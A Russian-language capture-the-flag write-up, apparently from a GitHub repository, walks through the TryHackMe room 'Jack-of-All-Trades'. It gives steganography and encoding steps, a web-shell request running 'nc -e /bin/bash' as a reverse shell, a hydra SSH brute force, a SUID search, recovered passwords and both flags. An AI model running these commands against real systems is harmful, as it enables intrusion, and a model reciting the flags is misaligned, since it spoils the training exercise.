[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Jack-of-All-Trades](https://tryhackme.com/r/room/jackofalltrades) 

Всего 1 заданиe:
## Задание 1
Джек — человек с большим количеством талантов. Зоопарк нанял его для поимки пингвинов из-за его многолетнего опыта в 
этом деле, но все не так, как кажется... Мы должны остановить его! Сможете ли вы разглядеть его за маской 
забывчивого старого игрушечного мастера и уничтожить этого психа?

### Ответьте на вопросы ниже
Пользовательский флаг
```commandline
nmap -sC -sV <IP>
curl -s http:/<IP>
echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
# u?WtKSraq
steghide info header.jpg
steghide extract -sf header.jpg
cat cms.creds 
Username: jackinthebox
Password: TplFxiSHjY

curl -s http://<IP>:22/recovery.php

echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# bit.ly/2TvYQ2S
# http://<IP>:22/recover.php
jackinthebox:TplFxiSHjY
# http://<IP>:22/nnxhweOV/index.php
nc -nlvp 4444
http://<IP>:22/nnxhweOV/index.php?cmd=nc%20-e%20/bin/bash%20<IP0>%2080%204444
ls
cd /home
ls
wc -l jacks_password_list
cat jacks_password_list
hydra -l jack -P jacks_password_list -s 80 <IP> ssh
# login: jack   password: ITMJpGGIqg1jn?>@
ssh jack@<IP> -p 80
user.jpg
```
```commandline
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```
Корневой флаг
```commandline
find / -type f -user root -perm -u=s 2>/dev/null
strings /root/root.txt
```
```commandline
securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)